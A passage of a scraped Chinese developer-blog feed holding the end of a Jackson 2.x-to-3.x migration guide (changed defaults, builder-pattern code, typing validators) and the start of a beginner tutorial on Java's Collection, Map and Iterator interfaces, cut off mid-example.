映射字段添加显式的 setter 方法。</td></tr><tr><td/><td>SORT_PROPERTIES_ALPHABETICALLY</td><td>关闭</td><td>开启</td><td>序列化 POJO 时默认按字段名字母排序输出；2.x 按字段定义顺序输出，3.x 改变输出顺序，可能导致依赖字段顺序的签名校验（如 MD5 验签）失败，需显式配置 @JsonPropertyOrder 固定顺序。</td></tr><tr><td/><td>OVERRIDE_PUBLIC_ACCESS_MODIFIERS</td><td>启用</td><td>关闭</td><td>不再覆盖公共字段 / 方法的访问修饰符（如强制访问 public final 方法）；2.x 可通过反射突破访问限制，3.x 禁用后，需确保 Bean 的字段 / 方法访问权限符合序列化要求（如 public getter）。</td></tr><tr><td>DateTimeFeature</td><td>ONE_BASED_MONTHS</td><td>关闭</td><td>开启</td><td>解析 / 序列化日期时，月份按 “1 基” 处理（1=1 月，12=12 月）；2.x 部分场景为 “0 基”（0=1 月），修复了月份解析的反直觉问题，但需校验老数据中 “0 基月份” 的兼容性（如 2025-00-09 会解析失败）。</td></tr><tr><td>StreamReadConstraints</td><td>DEFAULT_MAX_DEPTH</td><td>1000</td><td>500</td><td>JSON 嵌套解析的最大深度从 1000 降至 500；限制深层嵌套 JSON 的解析，防止栈溢出攻击，但解析超过 500 层的嵌套 JSON 时会抛出 StreamConstraintsException，需调整超大嵌套 JSON 的解析限制。</td></tr><tr><td>StreamWriteConstraints</td><td>DEFAULT_MAX_DEPTH</td><td>1000</td><td>500</td><td>JSON 嵌套序列化的最大深度从 1000 降至 500；序列化深层嵌套对象（如递归引用的对象）时会提前终止，需优化对象结构，或通过 StreamWriteConstraints.builder().maxDepth(1000) 调整限制。</td></tr></tbody></table>
<p><strong>4. 功能拆分与迁移</strong></p>
<ul>
<li><strong>流式 API 特性拆分：</strong> JsonParser.Feature → StreamReadFeature（通用）+ JsonReadFeature（JSON 专用）；
JsonGenerator.Feature → StreamWriteFeature + JsonWriteFeature（其他格式如 XML/YAML 同理）。</li>
<li><strong>迁移配置：</strong></li>
</ul>









































































































<table><thead><tr><th>属性/方法</th><th>原位置</th><th>迁移位置</th></tr></thead><tbody><tr><td>ADJUST_DATES_TO_CONTEXT_TIME_ZONE</td><td>DeserializationFeature  </td><td>DateTimeFeature</td></tr><tr><td>READ_DATE_TIMESTAMPS_AS_NANOSECONDS </td><td>DeserializationFeature  </td><td>DateTimeFeature</td></tr><tr><td>FAIL_ON_NUMBERS_FOR_ENUMS </td><td>DeserializationFeature  </td><td>EnumFeature </td></tr><tr><td>READ_ENUMS_USING_TO_STRING  </td><td>DeserializationFeature  </td><td>EnumFeature </td></tr><tr><td>READ_UNKNOWN_ENUM_VALUES_AS_NULL </td><td>DeserializationFeature  </td><td>EnumFeature </td></tr><tr><td>READ_UNKNOWN_ENUM_VALUES_USING_DEFAULT_VALUE </td><td>DeserializationFeature  </td><td>EnumFeature </td></tr><tr><td>WRITE_DATES_AS_TIMESTAMPS </td><td>SerializationFeature </td><td>DateTimeFeature</td></tr><tr><td>WRITE_DATE_KEYS_AS_TIMESTAMPS</td><td>SerializationFeature </td><td>DateTimeFeature</td></tr><tr><td>WRITE_DATE_TIMESTAMPS_AS_NANOSECONDS</td><td>SerializationFeature </td><td>DateTimeFeature</td></tr><tr><td>WRITE_DATES_WITH_CONTEXT_TIME_ZONE</td><td>SerializationFeature </td><td>DateTimeFeature</td></tr><tr><td>WRITE_DURATIONS_AS_TIMESTAMPS</td><td>SerializationFeature </td><td>DateTimeFeature</td></tr><tr><td>WRITE_DATES_WITH_ZONE_ID</td><td>SerializationFeature </td><td>DateTimeFeature</td></tr><tr><td>WRITE_ENUMS_USING_TO_STRING </td><td>SerializationFeature </td><td>EnumFeature </td></tr><tr><td>WRITE_ENUMS_USING_INDEX </td><td>SerializationFeature </td><td>EnumFeature </td></tr><tr><td>WRITE_ENUM_KEYS_USING_INDEX </td><td>SerializationFeature </td><td>EnumFeature </td></tr><tr><td>createContextual()</td><td>ContextualDeserializer </td><td>ValueDeserializer</td></tr><tr><td>createContextual()</td><td>ContextualSerializer  </td><td>ValueSerializer</td></tr><tr><td>resolve()</td><td>ResolvableDeserializer   </td><td>ValueDeserializer</td></tr><tr><td>resolve()</td><td>ResolvableSerializer    </td><td>ValueSerializer</td></tr></tbody></table>
<h2 data-id="heading-2">三、注意事项（避坑关键）</h2>
<p><strong>1. 依赖管理建议</strong></p>
<p>优先使用 jackson-bom 统一版本（避免 jackson-annotations 版本冲突）：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencyManagement</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>tools.jackson<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jackson-bom<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>import<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>pom<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencyManagement</span>&gt;</span>
</code></pre>
<p>无需手动引入 jackson-core 和 jackson-annotations，jackson-databind 会自动传递依赖。</p>
<p><strong>2. 代码改造注意</strong></p>
<p><strong>ObjectMapper 构建：</strong> 必须用 Builder 模式，示例：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 3.x 正确写法</span>
<span class="hljs-type">JsonMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> JsonMapper.builder()
    .enable(JsonWriteFeature.ESCAPE_NON_ASCII)
    .changeDefaultPropertyInclusion(incl -&gt; incl.withValueInclusion(JsonInclude.Include.NON_NULL))
    .build();

<span class="hljs-comment">// 重新配置已有 mapper（不可变对象无法直接修改）</span>
<span class="hljs-type">JsonMapper</span> <span class="hljs-variable">newMapper</span> <span class="hljs-operator">=</span> mapper.rebuild()
    .enable(SerializationFeature.INDENT_OUTPUT)
    .build();
</code></pre>
<p><strong>泛型类型校验：</strong> LaissezFaireSubTypeValidator 不再公开，需用 BasicPolymorphicTypeValidator 构建：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">BasicPolymorphicTypeValidator</span> <span class="hljs-variable">validator</span> <span class="hljs-operator">=</span> BasicPolymorphicTypeValidator.builder()
    .allowIfSubType(<span class="hljs-string">"com.example"</span>)
    .build();
</code></pre>
<p><strong>日期格式/时区配置：</strong>
UTC 的默认形式现在尾部是 Z ，而不是像 2.x 版本中的  +00 。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">//错误的方式</span>
mapper.setDateFormat(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">"yyyy-MM-dd'T'HH:mm:ssZ"</span>));
mapper.setTimeZone(TimeZone.getDefault());

<span class="hljs-comment">//正确的方式</span>
<span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> JsonMapper.builder()
.defaultDateFormat(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">"yyyy-MM-dd'T'HH:mm:ssZ"</span>))
.defaultTimeZone(TimeZone.getDefault())
.build();
</code></pre>
<p><strong>序列化配置：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">//错误的方式</span>
mapper.setSerializationInclusion(JsonInclude.Include.NON_NULL);

<span class="hljs-comment">//正确的方式</span>
<span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> JsonMapper.builder()
  .changeDefaultPropertyInclusion(incl -&gt; incl.withValueInclusion(JsonInclude.Include.NON_NULL))
  .changeDefaultPropertyInclusion(incl -&gt; incl.withContentInclusion(JsonInclude.Include.NON_NULL))
  .build();

</code></pre>
<p><strong>可见性配置：</strong> MapperFeature.AUTO_DETECT_XXX 已移除，需通过 changeDefaultVisibility 配置：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">//错误的方式</span>
mapper.disable(MapperFeature.AUTO_DETECT_FIELDS);

<span class="hljs-comment">//正确的方式</span>
<span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> JsonMapper.builder()
    .changeDefaultVisibility(vc -&gt;
        vc.withFieldVisibility(JsonAutoDetect.Visibility.NONE))
.build();

</code></pre>
<p><strong>包含类型信息配置：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">//错误的方式</span>

mapper.activateDefaultTypingAsProperty(LaissezFaireSubTypeValidator.instance,
    ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS,
    <span class="hljs-string">"@class"</span>);
    
 <span class="hljs-comment">//正确的方式</span>
 
<span class="hljs-type">var</span> <span class="hljs-variable">typeValidator</span> <span class="hljs-operator">=</span> BasicPolymorphicTypeValidator.builder()
        .allowIfSubType(<span class="hljs-string">"my.package.base.name."</span>)
        .allowIfSubType(<span class="hljs-string">"java.util.concurrent."</span>)
        .allowIfSubTypeIsArray()
        <span class="hljs-comment">// ...</span>
        .build();
        
<span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> JsonMapper.builder()
    .activateDefaultTypingAsProperty(typeValidator, DefaultTyping.NON_CONCRETE_AND_ARRAYS, <span class="hljs-string">"@class"</span>)
.build();
   
</code></pre>
<p><strong>JsonNode 处理中的 DecimalNode 创建策略</strong>
通过 JsonNodeFactory 创建 DecimalNode 时，旧行为：可能会自动截断尾随零（如 1.200 → 1.2）新行为：默认不截断尾随零，保持最小限度修剪</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 示例：不同的表示方式</span>
<span class="hljs-type">BigDecimal</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"1.200"</span>);  <span class="hljs-comment">// 三位小数</span>
<span class="hljs-type">BigDecimal</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"1.2"</span>);     <span class="hljs-comment">// 一位小数</span>

<span class="hljs-comment">// 新行为：DecimalNode会保持原始精度</span>
<span class="hljs-comment">// value1 仍会表示为 "1.200"</span>
<span class="hljs-comment">// value2 仍会表示为 "1.2"</span>
</code></pre>
<p><strong>Month 序列化/反序列化行为变更</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// java.time.Month 枚举</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Month</span> {
    JANUARY,    <span class="hljs-comment">// 1</span>
    FEBRUARY,   <span class="hljs-comment">// 2</span>
    <span class="hljs-comment">// ... </span>
    DECEMBER    <span class="hljs-comment">// 12</span>
}

<span class="hljs-comment">// Jackson 2.x 序列化结果（默认）</span>
{<span class="hljs-string">"month"</span>: <span class="hljs-string">"JANUARY"</span>}  <span class="hljs-comment">// 或使用索引：{"month": 0}</span>

<span class="hljs-comment">// Jackson 3.x 序列化结果（默认）</span>
{<span class="hljs-string">"month"</span>: <span class="hljs-number">1</span>}  <span class="hljs-comment">// 直接使用 Month 的数值（1-12）</span>
</code></pre>
<p><strong>3. 性能优化点</strong></p>
<p><strong>关闭末尾字符校验：</strong> 若输入数据可信，可禁用 FAIL_ON_TRAILING_TOKENS 减少开销：</p>
<pre><code class="hljs language-java" lang="java">JsonMapper.builder().disable(DeserializationFeature.FAIL_ON_TRAILING_TOKENS).build();
</code></pre>
<p><strong>缓冲区回收配置：</strong> 3.x 默认使用双端队列回收池，高并发场景可切换回 2.x 的 ThreadLocal 池：</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-type">JsonFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> JsonFactory.builder() .recyclerPool(JsonRecyclerPools.threadLocalPool()) .build();
<span class="hljs-type">JsonMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> JsonMapper.builder(factory).build();
</code></pre>
<p><strong>4. 兼容性适配</strong></p>
<ul>
<li>若需保留 2.x 部分默认行为，可使用 JsonMapper.builderWithJackson2Defaults() 快速迁移（但无法覆盖所有配置）。</li>
<li>单元测试需重点检查：字段序列化顺序、日期格式、未知字段处理、枚举序列化方式等受默认配置变更影响的场景。</li>
</ul>
<p><strong>5. 生态支持</strong></p>
<ul>
<li>Spring 已在 2025.10 版本支持 Jackson 3.x（需升级 Spring 相关依赖）。</li>
<li>可使用 OpenRewrite 工具自动完成部分迁移（参考：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.openrewrite.org%2Frecipes%2Fjava%2Fjackson%2Fupgradejackson_2_3%25EF%25BC%2589%25E3%2580%2582" target="_blank" title="https://docs.openrewrite.org/recipes/java/jackson/upgradejackson_2_3%EF%BC%89%E3%80%82" ref="nofollow noopener noreferrer">docs.openrewrite.org/recipes/jav…</a></li>
</ul>
<h2 data-id="heading-3">总结</h2>
<p>Jackson 3.x 迁移的核心是 <strong>“环境升级 + 依赖变更 + Builder 模式适配 + 废弃 API 替换”</strong>，关键在于处理包名、不可变对象构建和默认配置变更带来的兼容性问题。建议先升级 JDK 17，再通过依赖替换、代码批量改造（重点是 ObjectMapper 构建和异常处理）、单元测试验证逐步完成迁移，优先使用官方提供的 Builder 方法和兼容工具减少手动改造成本。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Day26 | Java集合框架概览]]></title>    <link>https://juejin.cn/post/7581691182004158474</link>    <guid>https://juejin.cn/post/7581691182004158474</guid>    <pubDate>2025-12-10T01:04:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581691182004158474" data-draft-id="7581698074362183689" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Day26 | Java集合框架概览"/> <meta itemprop="keywords" content="后端,Java,Java EE"/> <meta itemprop="datePublished" content="2025-12-10T01:04:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="懒惰蜗牛"/> <meta itemprop="url" content="https://juejin.cn/user/615342556327752"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Day26 | Java集合框架概览
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/615342556327752/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    懒惰蜗牛
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:04:57.000Z" title="Wed Dec 10 2025 01:04:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>经过前面25天的学习，我们已经打下了Java的语言基础。</p>
<p>从今天起，我们进入一个全新的、至关重要的领域——Java集合框架。</p>
<h2 data-id="heading-0">一、什么是集合框架</h2>
<p>在没有集合框架之前，如果你需要存储一组学生对象，你可能会使用数组。</p>
<p>但数组有一个致命的缺陷：长度一旦确定，就没办法改变了。</p>
<p>定义短了，可能不够用，定义长了，又可能造成资源浪费。</p>
<p>为了解决这类问题，Java提供了一套性能优良、使用方便的API，用来表示和操作对象的集合。</p>
<p>可以把它看成一个收纳万物的"工具箱"，里面有各种各样的"容器"（比如列表、集合、队列、映射表等），可以高效地对数据进行增、删、改、查等操作。</p>
<p>为什么Java要给我们提供这些集合框架？</p>
<p>很多复杂的数据结构，你如链表、哈希表、红黑树等，Java集合框架已经帮我们实现好了，而且经过了一定的优化，不再需要我们从零开始实现这些结构，方便我们的使用。</p>
<p>这些数据结构是我们在日常开发中比较常使用的，集合框架都经过了精心设计和优化，通常情况下比我们自己去现写的要高效得多。</p>
<p>集合框架提供了一套标准化的接口，不管具体的实现是什么，或者发生什么变化，操作这些集合的方法都是一致的，我们在学习和使用的时候，成本都比较低。</p>
<h2 data-id="heading-1">二、Java集合框架图谱</h2>
<p>Java集合框架主要由两个核心接口分支构成，它们是所有集合类的"老祖宗"：</p>
<h3 data-id="heading-2">2.1 Collection</h3>
<p>ArrayList</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5db3f698026843a1bde16a81be1e2c2f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oeS5oOw6JyX54mb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765933496&amp;x-signature=MzyhOvCyGvVXuufBJltJaLSbjqM%3D" alt="" loading="lazy"/></p>
<p>HashSet</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/34c2de38a7144144ae3c4fb5b2c4af6f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oeS5oOw6JyX54mb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765933496&amp;x-signature=Y5FpR%2FH5Q%2F4vUYlDs0poT6qAKTA%3D" alt="" loading="lazy"/></p>
<p>PriorityQueue</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d2b2440929d4d42baf76d11e2a951da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oeS5oOw6JyX54mb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765933496&amp;x-signature=eCopsBRBDA%2Frp52mChntm9Ay8pw%3D" alt="" loading="lazy"/></p>
<p>上面的ArrayList、HashSet、PriorityQueue都实现了一个共同的接口Collection。</p>
<p>Collection是存放独立元素的集合的根接口。它的特点就是，容器里的每个位置只存放一个元素。</p>
<p>Collection有三个主要的子接口：List、Set、Queue。</p>
<p>List是一个有序的集合，允许存放重复的元素。你可以像操作数组一样通过索引来访问元素。（代表实现：ArrayList, LinkedList）</p>
<p>Set是一个不重复元素的集合。它不保证元素的顺序（某些实现类除外）。（代表实现：HashSet, TreeSet）</p>
<p>Queue是一个按特定规则（通常是先进先出FIFO）来处理元素的集合。（代表实现：LinkedList, PriorityQueue）</p>
<h3 data-id="heading-3">2.2 Map</h3>
<p>HashMap</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7395cdac69840e598d400fd6ff2c33c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oeS5oOw6JyX54mb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765933496&amp;x-signature=PV4b4x6Xi3cIxNQFBa9JpsrCOpE%3D" alt="" loading="lazy"/></p>
<p>Map是存放键值对的集合的根接口。</p>
<p>Map里的每个元素都包含一个唯一的键（Key）和一个值（Value）。</p>
<p>它不继承自Collection接口，自成一派。（代表实现：HashMap, TreeMap）</p>
<h2 data-id="heading-4">三、Collection的核心能力</h2>
<p>Collection接口定义了所有单元素集合都必须具备的通用方法。</p>
<p>掌握了它，你就掌握了操作List、Set、Queue的一半了。</p>
<p>一起简单的梳理下Collection中定义的属性和行为：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Collection</span>&lt;E&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Iterable</span>&lt;E&gt; {
<span class="hljs-comment">// 集合里装的元素个数</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span>;

<span class="hljs-comment">// 集合是不是空的</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">isEmpty</span><span class="hljs-params">()</span>;

<span class="hljs-comment">// 集合里是不是包含某个对象</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">contains</span><span class="hljs-params">(Object o)</span>;

<span class="hljs-comment">// 返回一个用来遍历集合的迭代器</span>
Iterator&lt;E&gt; <span class="hljs-title function_">iterator</span><span class="hljs-params">()</span>;

<span class="hljs-comment">// 把集合转换成一个Object数组</span>
Object[] toArray();

<span class="hljs-comment">// 把集合转换成一个指定类型的数组</span>
&lt;T&gt; T[] toArray(T[] a);

<span class="hljs-comment">// 添加一个元素到集合里</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">add</span><span class="hljs-params">(E e)</span>;

<span class="hljs-comment">// 从集合里移除一个元素</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">remove</span><span class="hljs-params">(Object o)</span>;

<span class="hljs-comment">// 把另一个集合的所有元素都添加到这个集合</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">addAll</span><span class="hljs-params">(Collection&lt;? extends E&gt; c)</span>;

<span class="hljs-comment">// 移除集合里也存在于另一个集合中的所有元素</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">removeAll</span><span class="hljs-params">(Collection&lt;?&gt; c)</span>;

<span class="hljs-comment">// 清空集合里的所有元素</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">clear</span><span class="hljs-params">()</span>;
}
</code></pre>
<blockquote>
<p>Collection里的E就是我们之前学习的泛型，表示元素的类型。</p>
</blockquote>
<h2 data-id="heading-5">四、Iterable和Iterator</h2>
<p>你可能已经注意到，Collection接口继承了一个Iterable接口。</p>
<p>Iterable接口其实是Java 5引入的，它让实现了这个接口的集合都具备了使用for-each循环的能力。</p>
<blockquote>
<p>我们在看继承关系的时候，看到able结尾的接口，大多数情况下下就可以理解成，让子类具有某项能力。</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Iterable</span>&lt;E&gt; {
    Iterator&lt;E&gt; <span class="hljs-title function_">iterator</span><span class="hljs-params">()</span>;
}
</code></pre>
<p>Iterator（迭代器） 可以看成真正负责遍历的指针。</p>
<p>类似一个游标，在集合上移动，并提供了安全地访问和删除元素的方法。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Iterator</span>&lt;E&gt; {
<span class="hljs-comment">// 判断集合里是不是还有下一个元素可以访问。</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">hasNext</span><span class="hljs-params">()</span>;

<span class="hljs-comment">// 返回集合里的下一个元素，并将"指针"后移一位。</span>
E <span class="hljs-title function_">next</span><span class="hljs-params">()</span>;

}
</code></pre>
<p>提到删除元素，我们在初学的时候，还会遇到一个坑。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.lazy.snail.day26;

<span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@ClassName</span> Day26Demo
 * <span class="hljs-doctag">@Description</span> TODO
 * <span class="hljs-doctag">@Author</span> lazysnail
 * <span class="hljs-doctag">@Date</span> 2025/6/23 13:42
 * <span class="hljs-doctag">@Version</span> 1.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Day26Demo</span> {
